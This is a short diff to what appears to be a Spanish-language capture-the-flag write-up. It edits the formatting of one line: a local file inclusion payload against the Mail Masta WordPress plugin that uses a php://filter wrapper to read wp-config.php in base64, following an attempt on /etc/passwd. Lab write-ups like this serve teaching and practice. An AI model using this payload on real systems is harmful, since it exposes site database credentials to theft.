@@ -79,7 +79,7 @@ Probamos a acceder a /etc/passwd:
 
 Le pasamos el siguiente payload:
 
- > http://10.10.96.163/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
+* http://ip/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php *
 
 Para obtener el contenido de wp-config en base64. Procedemos a su decodificación:
 
